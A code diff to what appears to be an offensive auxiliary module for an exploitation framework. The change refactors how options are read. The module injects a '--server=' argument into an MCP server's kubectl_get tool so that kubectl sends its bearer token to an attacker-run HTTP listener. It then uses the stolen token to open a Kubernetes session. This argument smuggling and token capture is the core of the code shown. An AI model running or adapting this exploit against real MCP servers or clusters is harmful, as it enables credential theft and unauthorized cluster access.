@@ -90,21 +90,18 @@ class Module(Auxiliary, Http_client, Http_server):
         self._callback_hit = False
         self._capture_event = threading.Event()
 
-    def _opt(self, option) -> str:
-        return str(option.value if hasattr(option, "value") else option or "").strip()
-
     def _mcp_path(self) -> str:
-        value = self._opt(self.path) or "/mcp"
+        value = str(self.path or "/mcp").strip() or "/mcp"
         return value if value.startswith("/") else f"/{value}"
 
     def _resolve_callback_host(self) -> str:
-        manual = self._opt(self.callback_host)
+        manual = str(self.callback_host or "").strip()
         if manual:
             return manual
-        lhost = self._opt(getattr(self, "lhost", ""))
+        lhost = str(self.lhost or "").strip()
         if lhost:
             return lhost
-        srvhost = self._opt(getattr(self, "srvhost", "0.0.0.0"))
+        srvhost = str(self.srvhost or "0.0.0.0").strip()
         if srvhost and srvhost not in ("0.0.0.0", "::"):
             return srvhost
         raise RuntimeError(
@@ -112,11 +109,11 @@ class Module(Auxiliary, Http_client, Http_server):
         )
 
     def _callback_url(self, host: str) -> str:
-        port = int(self.srvport.value if hasattr(self.srvport, "value") else self.srvport)
+        port = int(self.srvport or 8080)
         return f"http://{host}:{port}"
 
     def _call_tool(self, server_url: str):
-        tool = self._opt(self.tool) or "kubectl_get"
+        tool = str(self.tool or "kubectl_get").strip() or "kubectl_get"
         return self.http_request(
             method="POST",
             path=self._mcp_path(),
@@ -128,7 +125,7 @@ class Module(Auxiliary, Http_client, Http_server):
                     "arguments": {
                         "resourceType": f"--server={server_url}",
                         "name": "dummy-pod",
-                        "namespace": self._opt(self.namespace) or "default",
+                        "namespace": str(self.namespace or "default").strip() or "default",
                         "output": "json",
                     },
                 },
@@ -166,13 +163,13 @@ class Module(Auxiliary, Http_client, Http_server):
             if handler.command != "HEAD":
                 handler.wfile.write(body)
 
-        if not self._opt(self.srvhost):
+        if not self.srvhost:
             self.srvhost = "0.0.0.0"
         methods = {method: handle_request for method in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS")}
         return self.listen_http(methods, forever=True, background=True)
 
     def _register_k8s_session(self, token: str) -> bool:
-        cluster_api = self._opt(self.cluster_api)
+        cluster_api = str(self.cluster_api or "").strip()
         if not cluster_api:
             print_warning("Token captured — set CLUSTER_API to open a Kubernetes session")
             return True
@@ -192,7 +189,7 @@ class Module(Auxiliary, Http_client, Http_server):
             api_server=cluster_api,
             token=token,
             insecure=bool(self.insecure),
-            namespace=self._opt(self.namespace) or "default",
+            namespace=str(self.namespace or "default").strip() or "default",
             timeout=float(self.timeout or 30),
         )
         if not client.connect():
